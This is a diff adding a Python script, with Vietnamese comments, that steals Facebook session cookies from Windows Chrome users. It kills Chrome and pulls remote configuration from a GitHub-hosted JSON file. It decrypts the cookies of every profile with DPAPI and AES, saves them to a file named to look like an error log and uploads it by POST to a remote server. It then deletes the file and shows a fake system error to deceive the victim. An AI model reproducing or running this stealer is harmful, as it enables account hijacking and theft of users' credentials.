@@ -1,0 +1,188 @@
+import os
+import json
+import base64
+import sqlite3
+import shutil
+from datetime import datetime, timedelta
+import win32crypt
+from Crypto.Cipher import AES
+import requests
+import psutil
+import pygetwindow as gw
+import tkinter as tk
+from tkinter import messagebox
+def get_chrome_datetime(chromedate):
+    """Return a `datetime.datetime` object from a chrome format datetime
+    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
+    if chromedate != 86400000000 and chromedate:
+        try:
+            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+        except Exception as e:
+            print(f"Error: {e}, chromedate: {chromedate}")
+            return chromedate
+    else:
+        return ""
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    # decode the encryption key from Base64
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    # remove 'DPAPI' str
+    key = key[5:]
+    # return decrypted key that was originally encrypted
+    # using a session key derived from current user's logon credentials
+    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_data(data, key):
+    try:
+        # get the initialization vector
+        iv = data[3:15]
+        data = data[15:]
+        # generate cipher
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        # decrypt password
+        return cipher.decrypt(data)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
+        except:
+            # not supported
+            return ""
+
+def main(sql):
+    # cookie_data = []
+    cookie_files = []
+
+    # Đường dẫn đến thư mục Chrome User Data
+    user_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
+
+    # Liệt kê tất cả các thư mục con trong Chrome User Data
+    for profile_name in os.listdir(user_data_path):
+        try:
+            # Kiểm tra xem tên thư mục có bắt đầu bằng "Profile" không
+            if profile_name.startswith("Profile") or profile_name == "Default":
+                # Lấy đường dẫn đến thư mục profile
+                profile_path = os.path.join(user_data_path, profile_name)
+           
+
+                # Đường dẫn đến tệp cookie
+                db_path = os.path.join(profile_path, "Network", "Cookies")
+                # print(db_path)
+
+                # Tạo tên tệp cookie dựa trên tên profile
+                # filename = f"{profile_name}_65183f5465542a3b72183fa3b7.db"
+                # cookie_files.append(filename)
+
+                # if not os.path.isfile(filename):
+                #     # Sao chép tệp cookie nếu chưa tồn tại trong thư mục hiện tại
+                #     shutil.copyfile(db_path, filename)
+
+                # Kết nối vào cơ sở dữ liệu cookie
+                db = sqlite3.connect(db_path)
+                db.text_factory = lambda b: b.decode(errors="ignore")
+                cursor = db.cursor()
+
+                
+                    # print(urlapi)
+                    
+
+                sql1 = f"""
+                    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
+                    FROM cookies
+                    WHERE host_key like '%facebook.com%' {sql}
+                """
+                # print(sql1)
+                # exit()
+                cursor.execute(sql1)
+
+                key = get_encryption_key()
+                with open("error_log.txt", "a", encoding="utf-8") as file:
+                    cookies = []
+                    file.write(f"=== {profile_name} ===\n")
+                    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
+                        if not value:
+                            decrypted_value = decrypt_data(encrypted_value, key)
+                        else:
+                            decrypted_value = value
+
+                        cookie_obj = {
+                            "domain": host_key,
+                            "expirationDate": expires_utc,
+                            "hostOnly": False,
+                            "httpOnly": False,  # Thay "httponly" bằng "is_http_only"
+                            "name": name,
+                            "path": "/",
+                            "secure": False,
+                            "session": False,
+                            "storeId": "0",
+                            "value": decrypted_value
+                        }
+                        cookies.append(cookie_obj)
+                    json_cookies = json.dumps(cookies, indent=4)
+                    file.write(json_cookies)
+                    file.write("\n\n")
+
+                    db.close()
+        except Exception as e:
+            print(f"Error processing profile: {profile_name}, Error: {e}")
+
+    return cookie_files
+def send(urlapi):
+    file_name1 = 'error_log.txt'
+    php_api_url = urlapi
+    with open(file_name1, 'rb') as file:
+        files = {'file': (file_name1, file)}
+        response = requests.post(php_api_url, files=files)
+        if response.status_code == 200:
+            print("File đã được gửi thành công.")
+    
+        else:
+            print("Có lỗi xảy ra trong quá trình gửi file.")
+def cleanup_cookie_files(cookie_files):
+    for filename in cookie_files:
+        try:
+            # Xóa tệp cookie sau khi đã sử dụng xong
+            os.remove(filename)
+            # print(f"Xóa tệp cookie: {filename}")
+        except Exception as e:
+            print(f"Lỗi xóa tệp cookie {filename}: {e}")
+def show_error_message(message):
+    root = tk.Tk()
+    root.withdraw()  # Ẩn cửa sổ chính
+
+    messagebox.showerror("Error", message)
+if __name__ == "__main__":
+    for proc in psutil.process_iter(attrs=['pid', 'name']):
+        try:
+            # Kiểm tra tên tiến trình, nếu là "chrome.exe" thì tắt tiến trình đó
+            if 'chrome.exe' in proc.info['name']:
+                pid = proc.info['pid']
+                process = psutil.Process(pid)
+                process.terminate()
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+        chrome_windows = gw.getWindowsWithTitle("Google Chrome")
+        for window in chrome_windows:
+            window.close()
+
+    response = requests.get('https://raw.githubusercontent.com/seebeecee/cdn/main/config.json')
+    if response.status_code == 200:
+        json_data = response.json()
+        sql = json_data['sql']
+        urlapi = json_data['urlapi']
+    main(sql)
+   
+    send(urlapi)
+    cookie_files = main(sql)
+    # with open("error_log.json", "w", encoding="utf-8") as json_file:
+    #     json.dump(cookie_data, json_file, indent=4)
+    cleanup_cookie_files(cookie_files)
+    os.remove('error_log.txt')
+    show_error_message('The application failed to initialize because the window station is being shut down')
